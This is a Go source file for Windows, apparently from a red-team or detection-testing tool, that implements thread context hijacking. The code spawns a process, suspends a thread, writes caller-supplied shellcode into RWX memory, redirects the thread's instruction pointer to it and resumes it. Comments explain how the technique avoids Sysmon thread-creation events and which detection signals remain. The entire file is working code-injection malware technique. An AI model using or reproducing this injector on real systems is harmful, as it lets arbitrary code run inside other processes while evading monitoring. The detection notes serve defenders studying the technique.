//go:build windows

package technique

import (
	"fmt"

	"golang.org/x/sys/windows"
)

// HijackInject hijacks an existing thread in a running target process.
//
// Evasion over APC technique:
//   - No new process creation (target process is spawned normally, not suspended)
//   - No CreateRemoteThread → no Sysmon Event 8
//   - Thread context redirect on an existing thread — harder to correlate
//
// Detection fingerprint:
//   - Sysmon Event 10: OpenProcess access
//   - RWX anonymous VirtualAllocEx region (Event 25 may not fire — no section object)
//   - Thread RIP redirected to anonymous memory (behavioral, requires ETW)
func HijackInject(target string, shellcode []byte) error {
	fmt.Printf("  [technique] Thread Context Hijacking\n")
	fmt.Printf("  [target]    %s  payload %d bytes\n", target, len(shellcode))

	// Spawn target normally — let it start so threads exist to hijack
	pi, err := spawnProcess(target, false)
	if err != nil {
		return err
	}
	fmt.Printf("  [spawned]   PID %d (running, not suspended)\n", pi.ProcessId)
	windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	// Wait for the process to initialize and create its threads
	sleepMS(800)

	// Find a thread to hijack
	tid, err := findThreadInProcess(pi.ProcessId)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("find thread: %w", err)
	}
	fmt.Printf("  [target tid] %d\n", tid)

	thread, err := openThread(THREAD_ALL_ACCESS, tid)
	if err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}
	defer windows.CloseHandle(thread)

	// Suspend the target thread while we redirect it
	if err := suspendThread(thread); err != nil {
		windows.TerminateProcess(pi.Process, 1)
		return err
	}
	fmt.Printf("  [suspended] TID %d\n", tid)

	// Allocate RWX memory in target and write shellcode
	// Note: anonymous RWX allocation is the detection signal here (VAD has no file path).
	// Thread RIP redirect is the behavioral signal — no section object means Event 25 is blind.
	addr, err := virtualAllocEx(pi.Process, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil {
		windows.ResumeThread(thread)
		windows.TerminateProcess(pi.Process, 1)
		return err
	}

	var written uintptr
	if err := windows.WriteProcessMemory(pi.Process, addr, &shellcode[0], uintptr(len(shellcode)), &written); err != nil {
		virtualFreeEx(pi.Process, addr)
		windows.ResumeThread(thread)
		windows.TerminateProcess(pi.Process, 1)
		return fmt.Errorf("WriteProcessMemory: %w", err)
	}
	fmt.Printf("  [alloc]     0x%x (RWX, %d bytes)\n", addr, len(shellcode))

	// Redirect RIP to shellcode
	ac, err := getThreadContext(thread)
	if err != nil {
		virtualFreeEx(pi.Process, addr)
		windows.ResumeThread(thread)
		windows.TerminateProcess(pi.Process, 1)
		return err
	}
	fmt.Printf("  [original RIP] 0x%x\n", ac.ctx.GetRip())

	ac.ctx.SetRip(uint64(addr))
	if err := setThreadContext(thread, ac); err != nil {
		virtualFreeEx(pi.Process, addr)
		windows.ResumeThread(thread)
		windows.TerminateProcess(pi.Process, 1)
		return err
	}
	fmt.Printf("  [ctx]       RIP hijacked → 0x%x\n", addr)

	if _, err := windows.ResumeThread(thread); err != nil {
		return fmt.Errorf("ResumeThread: %w", err)
	}
	fmt.Printf("  [resumed]   TID %d executing shellcode\n", tid)
	return nil
}
